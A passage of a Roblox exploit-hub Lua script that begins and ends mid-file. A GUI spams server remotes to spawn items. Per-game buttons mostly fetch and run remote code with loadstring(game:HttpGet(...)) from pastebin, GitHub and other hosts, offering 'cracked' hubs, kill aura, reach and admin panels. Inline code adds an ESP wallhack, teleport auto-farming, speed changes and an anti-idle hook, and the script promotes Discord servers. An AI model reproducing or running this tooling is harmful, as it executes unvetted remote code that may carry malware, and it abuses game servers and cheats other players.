SuperBlock.Selectable = false
SuperBlock.Size = UDim2.new(0, 150, 0, 35)
SuperBlock.AutoButtonColor = false
SuperBlock.Font = Enum.Font.SourceSans
SuperBlock.Text = "SuperBlock"
SuperBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
SuperBlock.TextSize = 28.000
 
GalaxyBlock.Name = "GalaxyBlock"
GalaxyBlock.Parent = Frame
GalaxyBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
GalaxyBlock.BorderSizePixel = 0
GalaxyBlock.Position = UDim2.new(0.0552381277, 0, 0.826666653, 0)
GalaxyBlock.Selectable = false
GalaxyBlock.Size = UDim2.new(0, 150, 0, 35)
GalaxyBlock.AutoButtonColor = false
GalaxyBlock.Font = Enum.Font.SourceSans
GalaxyBlock.Text = "GalaxyBlock"
GalaxyBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
GalaxyBlock.TextSize = 28.000
 
RainbowBlock.Name = "RainbowBlock"
RainbowBlock.Parent = Frame
RainbowBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
RainbowBlock.BorderSizePixel = 0
RainbowBlock.Position = UDim2.new(0.0552381277, 0, 0.679999948, 0)
RainbowBlock.Selectable = false
RainbowBlock.Size = UDim2.new(0, 150, 0, 35)
RainbowBlock.AutoButtonColor = false
RainbowBlock.Font = Enum.Font.SourceSans
RainbowBlock.Text = "RainbowBlock"
RainbowBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
RainbowBlock.TextSize = 28.000
 
DiamondBlock.Name = "DiamondBlock"
DiamondBlock.Parent = Frame
DiamondBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
DiamondBlock.BorderSizePixel = 0
DiamondBlock.Position = UDim2.new(0.0552381277, 0, 0.533333302, 0)
DiamondBlock.Selectable = false
DiamondBlock.Size = UDim2.new(0, 150, 0, 35)
DiamondBlock.AutoButtonColor = false
DiamondBlock.Font = Enum.Font.SourceSans
DiamondBlock.Text = "DiamondBlock"
DiamondBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
DiamondBlock.TextSize = 28.000
 
CopyDiscordServer.Name = "CopyDiscordServer"
CopyDiscordServer.Parent = Frame
CopyDiscordServer.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
CopyDiscordServer.BorderSizePixel = 0
CopyDiscordServer.Position = UDim2.new(0.531428576, 0, 0.826666713, 0)
CopyDiscordServer.Selectable = false
CopyDiscordServer.Size = UDim2.new(0, 194, 0, 35)
CopyDiscordServer.AutoButtonColor = false
CopyDiscordServer.Font = Enum.Font.SourceSans
CopyDiscordServer.Text = "CopyDiscordServer"
CopyDiscordServer.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyDiscordServer.TextSize = 28.000
 
DiscordServer_box.Name = "DiscordServer_box"
DiscordServer_box.Parent = Frame
DiscordServer_box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
DiscordServer_box.BorderSizePixel = 0
DiscordServer_box.Position = UDim2.new(0.531428576, 0, 0.709999979, 0)
DiscordServer_box.Size = UDim2.new(0, 194, 0, 35)
DiscordServer_box.ClearTextOnFocus = false
DiscordServer_box.Font = Enum.Font.SourceSans
DiscordServer_box.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
DiscordServer_box.PlaceholderText = "https://discord.gg/v7PDxkhqWt"
DiscordServer_box.Text = "https://discord.gg/v7PDxkhqWt"
DiscordServer_box.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordServer_box.TextSize = 14.000
 
lable_discord.Name = "lable_discord"
lable_discord.Parent = Frame
lable_discord.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
lable_discord.BackgroundTransparency = 1.000
lable_discord.Position = UDim2.new(0.531428576, 0, 0.533333361, 0)
lable_discord.Size = UDim2.new(0, 194, 0, 53)
lable_discord.Font = Enum.Font.SourceSans
lable_discord.Text = "--You will find many other scripts in this discord server."
lable_discord.TextColor3 = Color3.fromRGB(0, 170, 0)
lable_discord.TextScaled = true
lable_discord.TextSize = 28.000
lable_discord.TextWrapped = true
 
open_box.Name = "open_box"
open_box.Parent = Frame
open_box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
open_box.BorderSizePixel = 0
open_box.Position = UDim2.new(0.750476241, 0, 0.313333333, 0)
open_box.Size = UDim2.new(0, 56, 0, 35)
open_box.ClearTextOnFocus = false
open_box.Font = Enum.Font.SourceSans
open_box.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
open_box.PlaceholderText = "Value"
open_box.Text = "1"
open_box.TextColor3 = Color3.fromRGB(255, 255, 255)
open_box.TextSize = 28.000
open_box.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
 
toBox.Name = "toBox"
toBox.Parent = Frame
toBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
toBox.BackgroundTransparency = 1.000
toBox.Position = UDim2.new(0.531428635, 0, 0.286666691, 0)
toBox.Size = UDim2.new(0, 194, 0, 50)
toBox.Font = Enum.Font.SourceSans
toBox.Text = "0 to "
toBox.TextColor3 = Color3.fromRGB(255, 255, 255)
toBox.TextSize = 28.000
 
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.Position = UDim2.new(0.400000006, 0, 0.170000002, 0)
Frame_2.Size = UDim2.new(0, 0, 0, 292)
 
close.Name = "close"
close.Parent = Frame
close.BackgroundTransparency = 1.000
close.Position = UDim2.new(0.90054822, 0, 0.00678133965, 0)
close.Size = UDim2.new(0, 45, 0, 45)
close.ZIndex = 2
close.Image = "rbxassetid://3926305904"
close.ImageRectOffset = Vector2.new(284, 4)
close.ImageRectSize = Vector2.new(24, 24)
 
 
----------------------------------------------------------------
 
close.MouseButton1Click:connect(function()
    Frame.Visible = false
end)
 
LuckyBlock_2.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnLuckyBlock:FireServer()
    end
end)
 
DiamondBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnDiamondBlock:FireServer()
    end
end)
 
SuperBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnSuperBlock:FireServer()
    end
end)
 
RainbowBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
    end
end)
 
GalaxyBlock.MouseButton1Click:connect(function()
    for i=1, open_box.Text do --This number means that you'll get 100 gears (you can change this)
        game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
    end
end)
 
CopyDiscordServer.MouseButton1Down:connect(function()
    setclipboard("https://discord.gg/TyUzMpMMUE")
    wait(1)
    game.StarterGui:SetCore("SendNotification", {
        Title = "Success!";
        Text = "Copy Discord: https://discord.gg/v7PDxkhqWt"; -- what the text says (ofc)
        Duration = 5;
    })
end)
      end, 
   })

   -- weight lifting simulator 3
elseif game.GameId==6638443271 then
   local gameTab = Window:CreateTab("Weight Lifting Simulator 3", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Weight Lifting Simulator 3 (MIGHT NOT WORK)")
  
   local Button = gameTab:CreateButton({
      Name = "Weight Lifting Simulator 3",
      Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/itsnoctural/Utilities/refs/heads/main/MyLittlePonyTycoon.lua"))()
      end, 
   })

   -- Launch Into Space Simulator
elseif game.GameId==5361859890 then
   local gameTab = Window:CreateTab("Launch Into Space Simulator", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Launch Into Space Simulator")
  
   local Button = gameTab:CreateButton({
      Name = "Cat Hub I guess",
      Callback = function()
         loadstring(game:HttpGet('https://whimper.xyz/cathub.lua'))()
      end, 
   })

   -- Launch Into Space Simulator
elseif game.GameId==6358769809 then
   local gameTab = Window:CreateTab("Every Click +1 Speed", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Every Click +1 Speed")
  
   local Button = gameTab:CreateButton({
      Name = "Xeno Hub (HAS KEY SYSTEM)",
      Callback = function()
         loadstring(game:HttpGet('https://www.xenonhub.xyz/loader.lua'))()
      end, 
   })

   -- Gym League
elseif game.GameId==5972059550 then
   local gameTab = Window:CreateTab("Gym League", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Gym League")
  
   local Button = gameTab:CreateButton({
      Name = "Ather Hub",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Athergaming/Roblox-Gym-League-Script/main/AtherHub%20Gym%20League%20V1_5.lua"))() 
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "Cats Hub",
      Callback = function()
         loadstring(game:HttpGet('https://gist.githubusercontent.com/afyzone/d8b7c8da9fb09c80937f4536648dbd9a/raw/'))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "Speed Hub X",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Script-Games/main/Gym%20League.lua"))()
      end, 
   })

   -- Yeet A Friend
elseif game.GameId==4147392742 then
   local gameTab = Window:CreateTab("Yeet A Friend", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Yeet A Friend")
  
   local Button = gameTab:CreateButton({
      Name = "Xeno Hub (HAS KEY SYSTEM)",
      Callback = function()
         loadstring(game:HttpGet('https://www.xenonhub.xyz/loader.lua'))()
      end, 
   })

   -- Animal Evolution Simulator
elseif game.GameId==3358419523 then
   local gameTab = Window:CreateTab("Animal Evolution Simulator", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Animal Evolution Simulator")
  
   local Button = gameTab:CreateButton({
      Name = "KAITO Hub Script",
      Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/Jcn4zsL2"))()
      end, 
   })


     -- Combat Warriors
elseif game.GameId==1390601379 then
   local gameTab = Window:CreateTab("Combat Warriors", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Combat Warriors")
  
   local Button = gameTab:CreateButton({
      Name = "Stratos Hub Cracked",
      Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/wTqvTGZ8/raw"))()
      end, 
   })

   -- Criminality 
elseif game.GameId==1494262959 then
   local gameTab = Window:CreateTab("Criminality ", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Criminality")
  
   local Button = gameTab:CreateButton({
      Name = "Vanish Hub",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ZenExploit/VanishHub/refs/heads/main/VanishCrimHub"))()
      end, 
   })

   -- Dragon Blox 
elseif game.GameId==1147304238 then
   local gameTab = Window:CreateTab("Dragon Blox ", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Dragon Blox")
  
   local Button = gameTab:CreateButton({
      Name = "Auto Rebirth",
      Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/KpczpBpS"))()
      end, 
   })

   -- Granny
elseif game.GameId==2165551367 then
   local gameTab = Window:CreateTab("Granny", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Granny")
  
   local Button = gameTab:CreateButton({
      Name = "Zephyr V3",
      Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/hLUpxYC4",true))()
      end, 
   })

   -- In Plain Sight 2
elseif game.GameId==1049111999 then
   local gameTab = Window:CreateTab("In Plain Sight 2", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("In Plain Sight 2")
  
   local Button = gameTab:CreateButton({
      Name = "idk the name of this but credits to owner!",
      Callback = function()
         local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("In Plain Sight 2", "BloodTheme")

local Tab = Window:NewTab("Main")
local Section = Tab:NewSection("ESP")
Section:NewButton("Camera", ".", function()
    if game.PlaceVersion ~= 5572 then
    local response = messagebox("The script detected a game update!nPlease use an alt account to test if the script is still safe!nnRun script?", "WARNING", 52)
    if response == 7 then return end
end
loadstring(game:HttpGet('https://raw.githubusercontent.com/choke-dev/RE-Script/main/In%20Plain%20Sight%202/Camera%20ESP.lua'))()
end)
Section:NewButton("Player", ".", function()
    _G.FriendColor = Color3.fromRGB(0, 0, 255)
_G.EnemyColor = Color3.fromRGB(255, 0, 0)
_G.UseTeamColor = true

--------------------------------------------------------------------
local Holder = Instance.new("Folder", game.CoreGui)
Holder.Name = "ESP"

local Box = Instance.new("BoxHandleAdornment")
Box.Name = "nilBox"
Box.Size = Vector3.new(1, 2, 1)
Box.Color3 = Color3.new(100 / 255, 100 / 255, 100 / 255)
Box.Transparency = 0.7
Box.ZIndex = 0
Box.AlwaysOnTop = false
Box.Visible = false

local NameTag = Instance.new("BillboardGui")
NameTag.Name = "nilNameTag"
NameTag.Enabled = false
NameTag.Size = UDim2.new(0, 200, 0, 50)
NameTag.AlwaysOnTop = true
NameTag.StudsOffset = Vector3.new(0, 1.8, 0)
local Tag = Instance.new("TextLabel", NameTag)
Tag.Name = "Tag"
Tag.BackgroundTransparency = 1
Tag.Position = UDim2.new(0, -50, 0, 0)
Tag.Size = UDim2.new(0, 300, 0, 20)
Tag.TextSize = 15
Tag.TextColor3 = Color3.new(100 / 255, 100 / 255, 100 / 255)
Tag.TextStrokeColor3 = Color3.new(0 / 255, 0 / 255, 0 / 255)
Tag.TextStrokeTransparency = 0.4
Tag.Text = "nil"
Tag.Font = Enum.Font.SourceSansBold
Tag.TextScaled = false

local LoadCharacter = function(v)
	repeat wait() until v.Character ~= nil
	v.Character:WaitForChild("Humanoid")
	local vHolder = Holder:FindFirstChild(v.Name)
	vHolder:ClearAllChildren()
	local b = Box:Clone()
	b.Name = v.Name .. "Box"
	b.Adornee = v.Character
	b.Parent = vHolder
	local t = NameTag:Clone()
	t.Name = v.Name .. "NameTag"
	t.Enabled = true
	t.Parent = vHolder
	t.Adornee = v.Character:WaitForChild("Head", 5)
	if not t.Adornee then
		return UnloadCharacter(v)
	end
	t.Tag.Text = v.Name
	b.Color3 = Color3.new(v.TeamColor.r, v.TeamColor.g, v.TeamColor.b)
	t.Tag.TextColor3 = Color3.new(v.TeamColor.r, v.TeamColor.g, v.TeamColor.b)
	local Update
	local UpdateNameTag = function()
		if not pcall(function()
			v.Character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
			local maxh = math.floor(v.Character.Humanoid.MaxHealth)
			local h = math.floor(v.Character.Humanoid.Health)
		end) then
			Update:Disconnect()
		end
	end
	UpdateNameTag()
	Update = v.Character.Humanoid.Changed:Connect(UpdateNameTag)
end

local UnloadCharacter = function(v)
	local vHolder = Holder:FindFirstChild(v.Name)
	if vHolder and (vHolder:FindFirstChild(v.Name .. "Box") ~= nil or vHolder:FindFirstChild(v.Name .. "NameTag") ~= nil) then
		vHolder:ClearAllChildren()
	end
end

local LoadPlayer = function(v)
	local vHolder = Instance.new("Folder", Holder)
	vHolder.Name = v.Name
	v.CharacterAdded:Connect(function()
		pcall(LoadCharacter, v)
	end)
	v.CharacterRemoving:Connect(function()
		pcall(UnloadCharacter, v)
	end)
	v.Changed:Connect(function(prop)
		if prop == "TeamColor" then
			UnloadCharacter(v)
			wait()
			LoadCharacter(v)
		end
	end)
	LoadCharacter(v)
end

local UnloadPlayer = function(v)
	UnloadCharacter(v)
	local vHolder = Holder:FindFirstChild(v.Name)
	if vHolder then
		vHolder:Destroy()
	end
end

for i,v in pairs(game:GetService("Players"):GetPlayers()) do
	spawn(function() pcall(LoadPlayer, v) end)
end

game:GetService("Players").PlayerAdded:Connect(function(v)
	pcall(LoadPlayer, v)
end)

game:GetService("Players").PlayerRemoving:Connect(function(v)
	pcall(UnloadPlayer, v)
end)

game:GetService("Players").LocalPlayer.NameDisplayDistance = 0

if _G.Reantheajfdfjdgs then
    return
end

_G.Reantheajfdfjdgs = ":suifayhgvsdghfsfkajewfrhk321rk213kjrgkhj432rj34f67df"

local players = game:GetService("Players")
local plr = players.LocalPlayer

function esp(target, color)
    if target.Character then
        if not target.Character:FindFirstChild("GetReal") then
            local highlight = Instance.new("Highlight")
            highlight.RobloxLocked = true
            highlight.Name = "GetReal"
            highlight.Adornee = target.Character
            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            highlight.FillColor = color
            highlight.Parent = target.Character
        else
            target.Character.GetReal.FillColor = color
        end
    end
end

while task.wait() do
    for i, v in pairs(players:GetPlayers()) do
        if v ~= plr then
            esp(v, _G.UseTeamColor and v.TeamColor.Color or ((plr.TeamColor == v.TeamColor) and _G.FriendColor or _G.EnemyColor))
        end
    end
end
end)
      end, 
   })

   -- Streetz War 2
elseif game.GameId==3993508361 then 
   local gameTab = Window:CreateTab("Streetz War 2", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Streetz War 2 (I have not tested all of these)")
  
   local Button = gameTab:CreateButton({
      Name = "Xenon Hub",
      Callback = function()
         loadstring(game:HttpGet('https://www.xenonhub.xyz/loader.lua'))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "Express Hub",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Theyfwdan/Theyfwdan/refs/heads/main/ExpressHubPaidVersion"))() 
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "UNDERLORDv1.7",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/KirawzWeb/Script/main/loader%20beta.lua",true))()
      end, 
   })

   -- Steal Time From Others
elseif game.GameId==3737753748 then 
   local gameTab = Window:CreateTab("Steal Time From Others", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Steal Time From Others")
  
   local Button = gameTab:CreateButton({
      Name = "Reach",
      Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/v85uKg67", true))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "Kill Aura",
      Callback = function()
         getgenv().Range = 10000000 --put range

loadstring(game:HttpGet('https://raw.githubusercontent.com/yeerma/such/main/migga'))()
      end, 
   })

    -- Slap Battles
elseif game.GameId==2380077519 then 
   local gameTab = Window:CreateTab("Slap Battles", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Slap Battles")
  
   local Button = gameTab:CreateButton({
      Name = "Slap Battle GUI",
      Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/Xr0NGW5g"))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "God Hub",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptPhantom/Scripts/refs/heads/main/slapbattles.lua"))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "InfiniteWare",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Kitler69/InfiniteWare/refs/heads/main/Launcher",true))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "Phantom Hub",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptPhantom/Scripts/refs/heads/main/slapbattles.lua"))()
      end, 
   })

    -- Vesteria
elseif game.GameId==833209132 then 
   local gameTab = Window:CreateTab("Vesteria", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Vesteria")
  
   local Button = gameTab:CreateButton({
      Name = "Epic Thing GUI",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ProtonDev-sys/Roblox/main/Vesteria%20V2%20rewrite.lua"))()
      end, 
   })

   -- Frisbee Simulator
elseif game.GameId==6260801986 then 
   local gameTab = Window:CreateTab("Frisbee Simulator", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Fast Win Farm")
  
   local Button = gameTab:CreateButton({
      Name = "ZONE ONE",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/CHASEAAAA/s/refs/heads/main/a",true))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "Zone 3",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/CHASEAAAA/sds/refs/heads/main/sdsd",true))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "Zone 4",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/CHASEAAAA/j/refs/heads/main/j",true))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "Zone 6",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/CHASEAAAA/sdsd/refs/heads/main/u",true))()
      end, 
   })

   -- Find The Keys
elseif game.GameId==4991107470 then 
   local gameTab = Window:CreateTab("Find The Keys", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Find The Keys")
  
   local Button = gameTab:CreateButton({
      Name = "Auto Farm",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterGuy/FBC/refs/heads/main/77_HMAIJ.lua.txt"))()
      end, 
   })

   -- Lumber Tycoon 2
elseif game.GameId==2471084 then 
   local gameTab = Window:CreateTab("Lumber Tycoon 2", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Lumber Tycoon 2")
  
   local Button = gameTab:CreateButton({
      Name = "Kron Hub",
      Callback = function()
         game:HttpGet("https://getexploits.com/cexecution/767792090360074240")

loadstring(game:HttpGet('https://raw.githubusercontent.com/DevKron/Kron_Hub/refs/heads/main/version_1.0'))("")
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "Sinister Finder",
      Callback = function()
         game:HttpGet("https://getexploits.com/cexecution/770335669515210752")

         getgenv().Settings = {
         
             Trees   = {"SpookyNeon"},
             Size    = "Small",
             WebHook = nil,
         
         }
         
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Aurora-2004/Aurora_Public/refs/heads/main/Tree_Finder/Tree%20Finder"))("Aurora On Top")
      end, 
   })

   -- Medieval War Simulator
elseif game.GameId==3187465210 then 
   local gameTab = Window:CreateTab("Medieval War Simulator", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Medieval War Simulator")
  
   local Button = gameTab:CreateButton({
      Name = "Admin Panel",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterGuy/FBC/refs/heads/main/Protected_2730679955143973.txt"))()
      end, 
   })

   -- Sonic Speed Simulator
elseif game.GameId==3405618667 then 
   local gameTab = Window:CreateTab("Sonic Speed Simulator", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Sonic Speed Simulator")
  
   local Button = gameTab:CreateButton({
      Name = "Imp Hub",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/alan11ago/Hub/refs/heads/main/ImpHub.lua"))()
      end, 
   })

   -- Scythe Simulator
elseif game.GameId==5998308727 then 
   local gameTab = Window:CreateTab("Scythe Simulator", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Scythe Simulator")
  
   local Button = gameTab:CreateButton({
      Name = "Scythe Simulator",
      Callback = function()
         --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("[UPD🎃] Scythe Simulator", "Sentinel")

local MainTab = Window:NewTab("Main")
local MainSection = MainTab:NewSection("Main Section")
local EggSection = MainTab:NewSection("Egg Section")
local MiscSection = MainTab:NewSection("Miscellaneous Section")

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local EggFrame = player.PlayerGui.MainGui.Frames.EggsFrame.ScrollingFrame

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Main
_G.AutoSwing = false
_G.AutoRebirth = false

-- Egg
_G.AutoHatch = false
_G.SelectedEgg = nil

-- Miscellaneous
_G.AutoHill = false
_G.AutoBonusArea = false
_G.SelcetedBonusArea = nil

local EggCost = {
    Egg1 = 250,
    Egg2 = 1000,
    Egg3 = 2500,
    Egg4 = 5000,
    Egg5 = 10000,
    Egg6 = 25000,
    Egg7 = 50000,
    Egg8 = 75000,
    Egg9 = 100000,
    Egg10 = 125000,
    Egg11 = 150000,
    Egg12 = 175000,
    Egg13 = 200000,
    Egg14 = 200000,
    Egg15 = 225000
}

local EggDropdown = {}
for Name, _ in pairs(EggCost) do
    local eggTitle = EggFrame:WaitForChild(Name).EggTitle.Text
    table.insert(EggDropdown, eggTitle)
end

local BonusAreaDropdown = {}
for _, area in ipairs(workspace.BonusAreas:GetChildren()) do
    local areaName = area.Name
    table.insert(BonusAreaDropdown, areaName)
end

MainSection:NewToggle("Auto Swing", "Automatically swings for you", function(state)
    _G.AutoSwing = state
    while _G.AutoSwing and task.wait(0.1) do
        if character:FindFirstChildOfClass("Tool") and character.Humanoid.Health > 0 then
            character:FindFirstChildOfClass("Tool"):Activate()
        elseif character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 then
            local tool = player.Backpack:FindFirstChildOfClass("Tool")
            if tool then
                character.Humanoid:EquipTool(tool)
            end
        end
    end
end)

MainSection:NewToggle("Auto Rebirth", "Automatically rebirth", function(state)
    _G.AutoRebirth = state
    while _G.AutoRebirth and task.wait(0.2) do
        if character.Humanoid.Health > 0 then
            local playerData = player:FindFirstChild("PlayerData")
            if playerData and playerData.Strength.Value >= playerData.RebirthRequirement.Value and playerData.CanRebirth.Value then
                ReplicatedStorage:WaitForChild("RebirthPlayer"):FireServer(false)
            end
        end
    end
end)

EggSection:NewDropdown("Select Egg", "Select the egg to hatch", EggDropdown, function(currentOption)
    _G.SelectedEgg = currentOption
end)

EggSection:NewToggle("Auto Hatch", "Automatically hatch selected egg", function(state)
    _G.AutoHatch = state
    while _G.AutoHatch and task.wait(0.2) do
        if character.Humanoid.Health > 0 then
            local HatchPet = ReplicatedStorage:WaitForChild("HatchPet")
            local hasSpace = ReplicatedStorage.CheckSpace:InvokeServer(false, 0, true)

            for Name, _ in pairs(EggCost) do
                if EggFrame:WaitForChild(Name).EggTitle.Text == _G.SelectedEgg then
                    if player.leaderstats.Gems.Value >= EggCost[Name] and hasSpace then
                        HatchPet:FireServer(Name, 1, hasSpace)
                    end
                    break
                end
            end
        end
    end
end)

MiscSection:NewDropdown("Select Area", "Select the area to teleport", BonusAreaDropdown, function(currentOption)
    _G.SelcetedBonusArea = currentOption
end)

MiscSection:NewToggle("Auto Bonus Area", "Automatically teleport to bonus area of the selected area", function(state)
    _G.AutoBonusArea = state
    while _G.AutoBonusArea and task.wait(0) do
        if character and character:FindFirstChild("HumanoidRootPart") and character.Humanoid.Health > 0 then
            for _, area in ipairs(workspace.BonusAreas:GetChildren()) do
                local areaName = area.Name
                if areaName == _G.SelcetedBonusArea then
                    local BonusArea = areaName:FindFirstChild('BonusArea')
                    BonusArea.CFrame = character.HumanoidRootPart.CFrame
                    break
                end
            end
        end
    end
end)

MiscSection:NewToggle("Auto Hill", "Automatically teleport to bonus area of KOTH", function(state)
    _G.AutoHill = state
    while _G.AutoHill and task.wait(0) do
        if character and character:FindFirstChild("HumanoidRootPart") and character.Humanoid.Health > 0 then
            for _, descendant in ipairs(Workspace:GetChildren()) do
                if descendant:IsA("Model") and descendant.Name == "KingOfHill" then
                    local bonusArea = descendant:FindFirstChild("BonusArea")
                    if bonusArea and bonusArea:GetAttribute("Bonus") == 700 then
                        bonusArea.CFrame = character.HumanoidRootPart.CFrame
                        break
                    end
                end
                task.wait(0)
            end
        end
    end
end)

character.Humanoid.WalkSpeed = 48
player.CharacterAdded:Connect(function(Char)
    character = Char
    character.Humanoid.WalkSpeed = 48
end)

player.Idled:Connect(function()
    local virtualUser = game:GetService('VirtualUser')
    virtualUser:CaptureController()
    virtualUser:ClickButton2(Vector2.new())
end)
      end, 
   })

    -- Taxi Boss
elseif game.GameId==2851381018 then 
   local gameTab = Window:CreateTab("Taxi Boss", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Taxi Boss")
  
   local Button = gameTab:CreateButton({
      Name = "Xenon Hub",
      Callback = function()
         loadstring(game:HttpGet('https://www.xenonhub.xyz/loader.lua'))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "Auto Menu",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/x7dJJ9vnFH23/Maintained-Fun/main/FUNC/Loader.lua", true))()
      end, 
   })

   -- Pet go
elseif game.GameId==6401952734 then
   local gameTab = Window:CreateTab("Pet go", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Pet go")

 local Button = gameTab:CreateButton({
    Name = "BANANA HUB",
    Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/diepedyt/bui/refs/heads/main/BananaHubLoader.lua"))()
    end, 
 })

 local Button = gameTab:CreateButton({
    Name = "Pet go",
    Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/rel/refs/heads/main/el"))()
    end, 
 })

 local Button = gameTab:CreateButton({
    Name = "Cracked OP",
    Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/giogio11223/abcdpetsim99/refs/heads/main/aaa",true))()
    end, 
 })

 -- Dress To impress
elseif game.GameId==5203828273 then
   local gameTab = Window:CreateTab("Dress to Impress", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Dress to Impress")

local Button = gameTab:CreateButton({
      Name = "Dress To impress w script",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/DTI-GUI-V2/main/dti_gui_v2.lua",true))()
      end, 
   })

   -- fisch
elseif game.GameId==5750914919 then
   local gameTab = Window:CreateTab("fisch", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("fisch")

   local Button = gameTab:CreateButton({
      Name = "w fisch",
      Callback = function()
